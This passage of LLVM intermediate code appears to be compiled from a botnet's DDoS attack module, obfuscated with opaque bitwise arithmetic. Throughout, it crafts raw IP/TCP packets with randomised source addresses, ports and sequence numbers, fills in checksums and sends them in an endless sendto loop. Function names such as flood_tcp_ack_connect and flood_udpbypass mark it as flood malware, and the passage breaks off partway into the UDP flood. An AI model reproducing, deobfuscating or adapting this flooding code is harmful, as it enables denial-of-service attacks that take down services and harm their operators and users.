  %266 = load i8*, i8** %265, align 8
  %267 = bitcast i8* %266 to %struct.iphdr*
  store %struct.iphdr* %267, %struct.iphdr** %24, align 8
  %268 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %269 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %268, i64 1
  %270 = bitcast %struct.iphdr* %269 to %struct.tcphdr*
  store %struct.tcphdr* %270, %struct.tcphdr** %25, align 8
  %271 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %272 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %271, i64 1
  %273 = bitcast %struct.tcphdr* %272 to i8*
  store i8* %273, i8** %26, align 8
  %274 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %275 = bitcast %struct.iphdr* %274 to i8*
  %276 = load i8, i8* %275, align 4
  %277 = xor i8 %276, -1
  %278 = xor i8 15, -1
  %279 = xor i8 -15, -1
  %280 = or i8 %277, %278
  %281 = or i8 -15, %279
  %282 = xor i8 %280, -1
  %283 = and i8 %282, %281
  %284 = and i8 %276, 15
  %285 = and i8 %283, 64
  %286 = xor i8 %283, 64
  %287 = or i8 %285, %286
  %288 = or i8 %283, 64
  store i8 %287, i8* %275, align 4
  %289 = load i8, i8* %16, align 1
  %290 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %291 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %290, i32 0, i32 1
  store i8 %289, i8* %291, align 1
  %292 = load i16, i16* %5, align 2
  %293 = zext i16 %292 to i64
  %294 = sub i64 0, %293
  %295 = sub i64 40, %294
  %296 = add i64 40, %293
  %297 = trunc i64 %295 to i16
  %298 = call zeroext i16 @htons(i16 zeroext %297) #9
  %299 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %300 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %299, i32 0, i32 2
  store i16 %298, i16* %300, align 2
  %301 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %302 = bitcast %struct.iphdr* %301 to i8*
  %303 = load i8, i8* %302, align 4
  %304 = xor i8 -16, -1
  %305 = xor i8 %303, %304
  %306 = and i8 %305, %303
  %307 = and i8 %303, -16
  %308 = and i8 %306, 5
  %309 = xor i8 %306, 5
  %310 = or i8 %308, %309
  %311 = or i8 %306, 5
  store i8 %310, i8* %302, align 4
  %312 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %313 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %312, i32 0, i32 4
  store i16 0, i16* %313, align 2
  %314 = load i8, i8* %7, align 1
  %315 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %316 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %315, i32 0, i32 5
  store i8 %314, i8* %316, align 4
  %317 = load i16, i16* %17, align 2
  %318 = call zeroext i16 @htons(i16 zeroext %317) #9
  %319 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %320 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %319, i32 0, i32 3
  store i16 %318, i16* %320, align 4
  %321 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %322 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %321, i32 0, i32 6
  store i8 6, i8* %322, align 1
  %323 = load i32, i32* %19, align 4
  %324 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %325 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %324, i32 0, i32 8
  store i32 %323, i32* %325, align 4
  %326 = load %struct.arguments*, %struct.arguments** %2, align 8
  %327 = getelementptr inbounds %struct.arguments, %struct.arguments* %326, i32 0, i32 0
  %328 = load %struct.target*, %struct.target** %327, align 8
  %329 = load i32, i32* %3, align 4
  %330 = sext i32 %329 to i64
  %331 = getelementptr inbounds %struct.target, %struct.target* %328, i64 %330
  %332 = getelementptr inbounds %struct.target, %struct.target* %331, i32 0, i32 0
  %333 = load i32, i32* %332, align 4
  %334 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %335 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %334, i32 0, i32 9
  store i32 %333, i32* %335, align 4
  %336 = load i16, i16* %6, align 2
  %337 = call zeroext i16 @htons(i16 zeroext %336) #9
  %338 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %339 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %338, i32 0, i32 0
  %340 = bitcast %union.anon* %339 to %struct.anon.0*
  %341 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %340, i32 0, i32 1
  store i16 %337, i16* %341, align 2
  %342 = load i16, i16* %8, align 2
  %343 = call zeroext i16 @htons(i16 zeroext %342) #9
  %344 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %345 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %344, i32 0, i32 0
  %346 = bitcast %union.anon* %345 to %struct.anon.0*
  %347 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %346, i32 0, i32 0
  store i16 %343, i16* %347, align 4
  %348 = load i32, i32* %18, align 4
  %349 = trunc i32 %348 to i16
  %350 = call zeroext i16 @htons(i16 zeroext %349) #9
  %351 = zext i16 %350 to i32
  %352 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %353 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %352, i32 0, i32 0
  %354 = bitcast %union.anon* %353 to %struct.anon.0*
  %355 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %354, i32 0, i32 2
  store i32 %351, i32* %355, align 4
  %356 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %357 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %356, i32 0, i32 0
  %358 = bitcast %union.anon* %357 to %struct.anon.0*
  %359 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %358, i32 0, i32 4
  %360 = load i16, i16* %359, align 4
  %361 = xor i16 -241, -1
  %362 = xor i16 %360, %361
  %363 = and i16 %362, %360
  %364 = and i16 %360, -241
  %365 = xor i16 %363, -1
  %366 = xor i16 80, -1
  %367 = xor i16 -15195, -1
  %368 = and i16 %365, -15195
  %369 = and i16 %363, %367
  %370 = and i16 %366, -15195
  %371 = and i16 80, %367
  %372 = or i16 %368, %369
  %373 = or i16 %370, %371
  %374 = xor i16 %372, %373
  %375 = or i16 %365, %366
  %376 = xor i16 %375, -1
  %377 = or i16 -15195, %367
  %378 = and i16 %376, %377
  %379 = or i16 %374, %378
  %380 = or i16 %363, 80
  store i16 %379, i16* %359, align 4
  %381 = load i8, i8* %10, align 1
  %382 = sext i8 %381 to i16
  %383 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %384 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %383, i32 0, i32 0
  %385 = bitcast %union.anon* %384 to %struct.anon.0*
  %386 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %385, i32 0, i32 4
  %387 = load i16, i16* %386, align 4
  %388 = xor i16 1, -1
  %389 = xor i16 %382, %388
  %390 = and i16 %389, %382
  %391 = and i16 %382, 1
  %392 = shl i16 %390, 12
  %393 = xor i16 %387, -1
  %394 = xor i16 -4097, -1
  %395 = xor i16 14629, -1
  %396 = or i16 %393, %394
  %397 = or i16 14629, %395
  %398 = xor i16 %396, -1
  %399 = and i16 %398, %397
  %400 = and i16 %387, -4097
  %401 = xor i16 %399, -1
  %402 = xor i16 %392, -1
  %403 = xor i16 -10678, -1
  %404 = and i16 %401, -10678
  %405 = and i16 %399, %403
  %406 = and i16 %402, -10678
  %407 = and i16 %392, %403
  %408 = or i16 %404, %405
  %409 = or i16 %406, %407
  %410 = xor i16 %408, %409
  %411 = or i16 %401, %402
  %412 = xor i16 %411, -1
  %413 = or i16 -10678, %403
  %414 = and i16 %412, %413
  %415 = or i16 %410, %414
  %416 = or i16 %399, %392
  store i16 %415, i16* %386, align 4
  %417 = load i8, i8* %11, align 1
  %418 = sext i8 %417 to i16
  %419 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %420 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %419, i32 0, i32 0
  %421 = bitcast %union.anon* %420 to %struct.anon.0*
  %422 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %421, i32 0, i32 4
  %423 = load i16, i16* %422, align 4
  %424 = xor i16 1, -1
  %425 = xor i16 %418, %424
  %426 = and i16 %425, %418
  %427 = and i16 %418, 1
  %428 = shl i16 %426, 8
  %429 = xor i16 -257, -1
  %430 = xor i16 %423, %429
  %431 = and i16 %430, %423
  %432 = and i16 %423, -257
  %433 = and i16 %431, %428
  %434 = xor i16 %431, %428
  %435 = or i16 %433, %434
  %436 = or i16 %431, %428
  store i16 %435, i16* %422, align 4
  %437 = load i8, i8* %12, align 1
  %438 = sext i8 %437 to i16
  %439 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %440 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %439, i32 0, i32 0
  %441 = bitcast %union.anon* %440 to %struct.anon.0*
  %442 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %441, i32 0, i32 4
  %443 = load i16, i16* %442, align 4
  %444 = xor i16 %438, -1
  %445 = xor i16 1, -1
  %446 = xor i16 4212, -1
  %447 = or i16 %444, %445
  %448 = or i16 4212, %446
  %449 = xor i16 %447, -1
  %450 = and i16 %449, %448
  %451 = and i16 %438, 1
  %452 = shl i16 %450, 13
  %453 = xor i16 -8193, -1
  %454 = xor i16 %443, %453
  %455 = and i16 %454, %443
  %456 = and i16 %443, -8193
  %457 = and i16 %455, %452
  %458 = xor i16 %455, %452
  %459 = or i16 %457, %458
  %460 = or i16 %455, %452
  store i16 %459, i16* %442, align 4
  %461 = load i8, i8* %13, align 1
  %462 = sext i8 %461 to i16
  %463 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %464 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %463, i32 0, i32 0
  %465 = bitcast %union.anon* %464 to %struct.anon.0*
  %466 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %465, i32 0, i32 4
  %467 = load i16, i16* %466, align 4
  %468 = xor i16 1, -1
  %469 = xor i16 %462, %468
  %470 = and i16 %469, %462
  %471 = and i16 %462, 1
  %472 = shl i16 %470, 11
  %473 = xor i16 %467, -1
  %474 = xor i16 -2049, -1
  %475 = xor i16 -26331, -1
  %476 = or i16 %473, %474
  %477 = or i16 -26331, %475
  %478 = xor i16 %476, -1
  %479 = and i16 %478, %477
  %480 = and i16 %467, -2049
  %481 = and i16 %479, %472
  %482 = xor i16 %479, %472
  %483 = or i16 %481, %482
  %484 = or i16 %479, %472
  store i16 %483, i16* %466, align 4
  %485 = load i8, i8* %14, align 1
  %486 = sext i8 %485 to i16
  %487 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %488 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %487, i32 0, i32 0
  %489 = bitcast %union.anon* %488 to %struct.anon.0*
  %490 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %489, i32 0, i32 4
  %491 = load i16, i16* %490, align 4
  %492 = xor i16 1, -1
  %493 = xor i16 %486, %492
  %494 = and i16 %493, %486
  %495 = and i16 %486, 1
  %496 = shl i16 %494, 10
  %497 = xor i16 -1025, -1
  %498 = xor i16 %491, %497
  %499 = and i16 %498, %491
  %500 = and i16 %491, -1025
  %501 = xor i16 %499, -1
  %502 = xor i16 %496, -1
  %503 = xor i16 30996, -1
  %504 = and i16 %501, 30996
  %505 = and i16 %499, %503
  %506 = and i16 %502, 30996
  %507 = and i16 %496, %503
  %508 = or i16 %504, %505
  %509 = or i16 %506, %507
  %510 = xor i16 %508, %509
  %511 = or i16 %501, %502
  %512 = xor i16 %511, -1
  %513 = or i16 30996, %503
  %514 = and i16 %512, %513
  %515 = or i16 %510, %514
  %516 = or i16 %499, %496
  store i16 %515, i16* %490, align 4
  %517 = load i8, i8* %15, align 1
  %518 = sext i8 %517 to i16
  %519 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %520 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %519, i32 0, i32 0
  %521 = bitcast %union.anon* %520 to %struct.anon.0*
  %522 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %521, i32 0, i32 4
  %523 = load i16, i16* %522, align 4
  %524 = xor i16 1, -1
  %525 = xor i16 %518, %524
  %526 = and i16 %525, %518
  %527 = and i16 %518, 1
  %528 = shl i16 %526, 9
  %529 = xor i16 -513, -1
  %530 = xor i16 %523, %529
  %531 = and i16 %530, %523
  %532 = and i16 %523, -513
  %533 = and i16 %531, %528
  %534 = xor i16 %531, %528
  %535 = or i16 %533, %534
  %536 = or i16 %531, %528
  store i16 %535, i16* %522, align 4
  %537 = call i32 @rand_new()
  %538 = xor i32 %537, -1
  %539 = xor i32 65535, -1
  %540 = xor i32 1485575457, -1
  %541 = or i32 %538, %539
  %542 = or i32 1485575457, %540
  %543 = xor i32 %541, -1
  %544 = and i32 %543, %542
  %545 = and i32 %537, 65535
  %546 = trunc i32 %544 to i16
  %547 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %548 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %547, i32 0, i32 0
  %549 = bitcast %union.anon* %548 to %struct.anon.0*
  %550 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %549, i32 0, i32 5
  store i16 %546, i16* %550, align 2
  %551 = load i32, i32* %20, align 4
  %552 = trunc i32 %551 to i16
  %553 = call zeroext i16 @htons(i16 zeroext %552) #9
  %554 = zext i16 %553 to i32
  %555 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %556 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %555, i32 0, i32 0
  %557 = bitcast %union.anon* %556 to %struct.anon.0*
  %558 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %557, i32 0, i32 3
  store i32 %554, i32* %558, align 4
  %559 = load i8*, i8** %26, align 8
  %560 = load i16, i16* %5, align 2
  %561 = zext i16 %560 to i32
  call void @rand_string(i8* %559, i32 %561)
  br label %562

; <label>:562:                                    ; preds = %261
  %563 = load i32, i32* %3, align 4
  %564 = add i32 %563, -1549632142
  %565 = add i32 %564, 1
  %566 = sub i32 %565, -1549632142
  %567 = add nsw i32 %563, 1
  store i32 %566, i32* %3, align 4
  br label %182

; <label>:568:                                    ; preds = %182
  br label %569

; <label>:569:                                    ; preds = %794, %568
  store i32 0, i32* %3, align 4
  br label %570

; <label>:570:                                    ; preds = %788, %569
  %571 = load i32, i32* %3, align 4
  %572 = load %struct.arguments*, %struct.arguments** %2, align 8
  %573 = getelementptr inbounds %struct.arguments, %struct.arguments* %572, i32 0, i32 3
  %574 = load i8, i8* %573, align 1
  %575 = zext i8 %574 to i32
  %576 = icmp slt i32 %571, %575
  br i1 %576, label %577, label %794

; <label>:577:                                    ; preds = %570
  %578 = load i8**, i8*** %9, align 8
  %579 = load i32, i32* %3, align 4
  %580 = sext i32 %579 to i64
  %581 = getelementptr inbounds i8*, i8** %578, i64 %580
  %582 = load i8*, i8** %581, align 8
  %583 = bitcast i8* %582 to %struct.iphdr*
  store %struct.iphdr* %583, %struct.iphdr** %27, align 8
  %584 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %585 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %584, i64 1
  %586 = bitcast %struct.iphdr* %585 to %struct.tcphdr*
  store %struct.tcphdr* %586, %struct.tcphdr** %28, align 8
  %587 = load %struct.arguments*, %struct.arguments** %2, align 8
  %588 = getelementptr inbounds %struct.arguments, %struct.arguments* %587, i32 0, i32 0
  %589 = load %struct.target*, %struct.target** %588, align 8
  %590 = load i32, i32* %3, align 4
  %591 = sext i32 %590 to i64
  %592 = getelementptr inbounds %struct.target, %struct.target* %589, i64 %591
  %593 = getelementptr inbounds %struct.target, %struct.target* %592, i32 0, i32 1
  %594 = load i16, i16* %593, align 4
  %595 = zext i16 %594 to i32
  %596 = icmp slt i32 %595, 32
  br i1 %596, label %597, label %621

; <label>:597:                                    ; preds = %577
  %598 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %599 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %598, i32 0, i32 9
  %600 = load i32, i32* %599, align 4
  %601 = call i32 @ntohl(i32 %600) #9
  %602 = call i32 @rand_new()
  %603 = load %struct.arguments*, %struct.arguments** %2, align 8
  %604 = getelementptr inbounds %struct.arguments, %struct.arguments* %603, i32 0, i32 0
  %605 = load %struct.target*, %struct.target** %604, align 8
  %606 = load i32, i32* %3, align 4
  %607 = sext i32 %606 to i64
  %608 = getelementptr inbounds %struct.target, %struct.target* %605, i64 %607
  %609 = getelementptr inbounds %struct.target, %struct.target* %608, i32 0, i32 1
  %610 = load i16, i16* %609, align 4
  %611 = zext i16 %610 to i32
  %612 = lshr i32 %602, %611
  %613 = sub i32 0, %601
  %614 = sub i32 0, %612
  %615 = add i32 %613, %614
  %616 = sub i32 0, %615
  %617 = add i32 %601, %612
  %618 = call i32 @htonl(i32 %616) #9
  %619 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %620 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %619, i32 0, i32 9
  store i32 %618, i32* %620, align 4
  br label %621

; <label>:621:                                    ; preds = %597, %577
  %622 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %623 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %622, i32 0, i32 8
  %624 = load i32, i32* %623, align 4
  %625 = icmp eq i32 %624, -1
  br i1 %625, label %626, label %630

; <label>:626:                                    ; preds = %621
  %627 = call i32 @rand_new()
  %628 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %629 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %628, i32 0, i32 8
  store i32 %627, i32* %629, align 4
  br label %630

; <label>:630:                                    ; preds = %626, %621
  %631 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %632 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %631, i32 0, i32 3
  %633 = load i16, i16* %632, align 4
  %634 = zext i16 %633 to i32
  %635 = icmp eq i32 %634, 65535
  br i1 %635, label %636, label %645

; <label>:636:                                    ; preds = %630
  %637 = call i32 @rand_new()
  %638 = xor i32 65535, -1
  %639 = xor i32 %637, %638
  %640 = and i32 %639, %637
  %641 = and i32 %637, 65535
  %642 = trunc i32 %640 to i16
  %643 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %644 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %643, i32 0, i32 3
  store i16 %642, i16* %644, align 4
  br label %645

; <label>:645:                                    ; preds = %636, %630
  %646 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %647 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %646, i32 0, i32 0
  %648 = bitcast %union.anon* %647 to %struct.anon.0*
  %649 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %648, i32 0, i32 1
  %650 = load i16, i16* %649, align 2
  %651 = zext i16 %650 to i32
  %652 = icmp eq i32 %651, 65535
  br i1 %652, label %653, label %668

; <label>:653:                                    ; preds = %645
  %654 = call i32 @rand_new()
  %655 = xor i32 %654, -1
  %656 = xor i32 65535, -1
  %657 = xor i32 -384655925, -1
  %658 = or i32 %655, %656
  %659 = or i32 -384655925, %657
  %660 = xor i32 %658, -1
  %661 = and i32 %660, %659
  %662 = and i32 %654, 65535
  %663 = trunc i32 %661 to i16
  %664 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %665 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %664, i32 0, i32 0
  %666 = bitcast %union.anon* %665 to %struct.anon.0*
  %667 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %666, i32 0, i32 1
  store i16 %663, i16* %667, align 2
  br label %668

; <label>:668:                                    ; preds = %653, %645
  %669 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %670 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %669, i32 0, i32 0
  %671 = bitcast %union.anon* %670 to %struct.anon.0*
  %672 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %671, i32 0, i32 0
  %673 = load i16, i16* %672, align 4
  %674 = zext i16 %673 to i32
  %675 = icmp eq i32 %674, 65535
  br i1 %675, label %676, label %687

; <label>:676:                                    ; preds = %668
  %677 = call i32 @rand_new()
  %678 = xor i32 65535, -1
  %679 = xor i32 %677, %678
  %680 = and i32 %679, %677
  %681 = and i32 %677, 65535
  %682 = trunc i32 %680 to i16
  %683 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %684 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %683, i32 0, i32 0
  %685 = bitcast %union.anon* %684 to %struct.anon.0*
  %686 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %685, i32 0, i32 0
  store i16 %682, i16* %686, align 4
  br label %687

; <label>:687:                                    ; preds = %676, %668
  %688 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %689 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %688, i32 0, i32 0
  %690 = bitcast %union.anon* %689 to %struct.anon.0*
  %691 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %690, i32 0, i32 2
  %692 = load i32, i32* %691, align 4
  %693 = icmp eq i32 %692, 65535
  br i1 %693, label %694, label %704

; <label>:694:                                    ; preds = %687
  %695 = call i32 @rand_new()
  %696 = xor i32 65535, -1
  %697 = xor i32 %695, %696
  %698 = and i32 %697, %695
  %699 = and i32 %695, 65535
  %700 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %701 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %700, i32 0, i32 0
  %702 = bitcast %union.anon* %701 to %struct.anon.0*
  %703 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %702, i32 0, i32 2
  store i32 %698, i32* %703, align 4
  br label %704

; <label>:704:                                    ; preds = %694, %687
  %705 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %706 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %705, i32 0, i32 0
  %707 = bitcast %union.anon* %706 to %struct.anon.0*
  %708 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %707, i32 0, i32 3
  %709 = load i32, i32* %708, align 4
  %710 = icmp eq i32 %709, 65535
  br i1 %710, label %711, label %721

; <label>:711:                                    ; preds = %704
  %712 = call i32 @rand_new()
  %713 = xor i32 65535, -1
  %714 = xor i32 %712, %713
  %715 = and i32 %714, %712
  %716 = and i32 %712, 65535
  %717 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %718 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %717, i32 0, i32 0
  %719 = bitcast %union.anon* %718 to %struct.anon.0*
  %720 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %719, i32 0, i32 3
  store i32 %715, i32* %720, align 4
  br label %721

; <label>:721:                                    ; preds = %711, %704
  %722 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %723 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %722, i32 0, i32 7
  store i16 0, i16* %723, align 2
  %724 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %725 = bitcast %struct.iphdr* %724 to i16*
  %726 = call zeroext i16 @ip_header_checksum(i16* %725, i32 20)
  %727 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %728 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %727, i32 0, i32 7
  store i16 %726, i16* %728, align 2
  %729 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %730 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %729, i32 0, i32 0
  %731 = bitcast %union.anon* %730 to %struct.anon.0*
  %732 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %731, i32 0, i32 6
  store i16 0, i16* %732, align 4
  %733 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %734 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %735 = bitcast %struct.tcphdr* %734 to i8*
  %736 = load i16, i16* %5, align 2
  %737 = zext i16 %736 to i64
  %738 = add i64 20, 8008547046644861607
  %739 = add i64 %738, %737
  %740 = sub i64 %739, 8008547046644861607
  %741 = add i64 20, %737
  %742 = trunc i64 %740 to i16
  %743 = call zeroext i16 @htons(i16 zeroext %742) #9
  %744 = load i16, i16* %5, align 2
  %745 = zext i16 %744 to i64
  %746 = add i64 20, -7351031213030408574
  %747 = add i64 %746, %745
  %748 = sub i64 %747, -7351031213030408574
  %749 = add i64 20, %745
  %750 = trunc i64 %748 to i32
  %751 = call zeroext i16 @tcp_udp_header_checksum(%struct.iphdr* %733, i8* %735, i16 zeroext %743, i32 %750)
  %752 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %753 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %752, i32 0, i32 0
  %754 = bitcast %union.anon* %753 to %struct.anon.0*
  %755 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %754, i32 0, i32 6
  store i16 %751, i16* %755, align 4
  %756 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %29, i32 0, i32 0
  store i16 2, i16* %756, align 4
  %757 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %758 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %757, i32 0, i32 0
  %759 = bitcast %union.anon* %758 to %struct.anon.0*
  %760 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %759, i32 0, i32 1
  %761 = load i16, i16* %760, align 2
  %762 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %29, i32 0, i32 1
  store i16 %761, i16* %762, align 2
  %763 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %764 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %763, i32 0, i32 9
  %765 = load i32, i32* %764, align 4
  %766 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %29, i32 0, i32 2
  %767 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %766, i32 0, i32 0
  store i32 %765, i32* %767, align 4
  %768 = load i32*, i32** %22, align 8
  %769 = load i32, i32* %3, align 4
  %770 = sext i32 %769 to i64
  %771 = getelementptr inbounds i32, i32* %768, i64 %770
  %772 = load i32, i32* %771, align 4
  %773 = load i8**, i8*** %9, align 8
  %774 = load i32, i32* %3, align 4
  %775 = sext i32 %774 to i64
  %776 = getelementptr inbounds i8*, i8** %773, i64 %775
  %777 = load i8*, i8** %776, align 8
  %778 = load i16, i16* %5, align 2
  %779 = zext i16 %778 to i64
  %780 = sub i64 0, %779
  %781 = sub i64 40, %780
  %782 = add i64 40, %779
  %783 = bitcast %union.__CONST_SOCKADDR_ARG* %30 to %struct.sockaddr**
  %784 = bitcast %struct.sockaddr_in* %29 to %struct.sockaddr*
  store %struct.sockaddr* %784, %struct.sockaddr** %783, align 8
  %785 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %30, i32 0, i32 0
  %786 = load %struct.sockaddr*, %struct.sockaddr** %785, align 8
  %787 = call i64 @sendto(i32 %772, i8* %777, i64 %781, i32 16384, %struct.sockaddr* %786, i32 16)
  br label %788

; <label>:788:                                    ; preds = %721
  %789 = load i32, i32* %3, align 4
  %790 = sub i32 %789, -199376514
  %791 = add i32 %790, 1
  %792 = add i32 %791, -199376514
  %793 = add nsw i32 %789, 1
  store i32 %792, i32* %3, align 4
  br label %570

; <label>:794:                                    ; preds = %570
  br label %569
                                                  ; No predecessors!
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @flood_tcp_ack_connect(%struct.arguments*) #0 {
  %2 = alloca %struct.arguments*, align 8
  store %struct.arguments* %0, %struct.arguments** %2, align 8
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @flood_udpbypass(%struct.arguments*) #0 {
  %2 = alloca %struct.arguments*, align 8
  %3 = alloca i16, align 2
  %4 = alloca i16, align 2
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32*, align 8
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %11 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %12 = alloca i32, align 4
  store %struct.arguments* %0, %struct.arguments** %2, align 8
  store i16 0, i16* %3, align 2
  store i16 0, i16* %4, align 2
  store i32 0, i32* %5, align 4
  %13 = load %struct.arguments*, %struct.arguments** %2, align 8
  %14 = getelementptr inbounds %struct.arguments, %struct.arguments* %13, i32 0, i32 3
  %15 = load i8, i8* %14, align 1
  %16 = zext i8 %15 to i64
  %17 = call noalias i8* @calloc(i64 %16, i64 4) #8
  %18 = bitcast i8* %17 to i32*
  store i32* %18, i32** %7, align 8
  %19 = load i32*, i32** %7, align 8
  %20 = icmp ne i32* %19, null
  br i1 %20, label %22, label %21

; <label>:21:                                     ; preds = %1
  call void @exit(i32 1) #10
  unreachable

; <label>:22:                                     ; preds = %1
  store i32 0, i32* %5, align 4
  br label %23

; <label>:23:                                     ; preds = %138, %22
  %24 = load i32, i32* %5, align 4
  %25 = load %struct.arguments*, %struct.arguments** %2, align 8
  %26 = getelementptr inbounds %struct.arguments, %struct.arguments* %25, i32 0, i32 3
  %27 = load i8, i8* %26, align 1
  %28 = zext i8 %27 to i32
  %29 = icmp slt i32 %24, %28
  br i1 %29, label %30, label %144

; <label>:30:                                     ; preds = %23
  %31 = load %struct.arguments*, %struct.arguments** %2, align 8
  %32 = getelementptr inbounds %struct.arguments, %struct.arguments* %31, i32 0, i32 1
  %33 = load %struct.option*, %struct.option** %32, align 8
  %34 = load %struct.arguments*, %struct.arguments** %2, align 8
  %35 = getelementptr inbounds %struct.arguments, %struct.arguments* %34, i32 0, i32 2
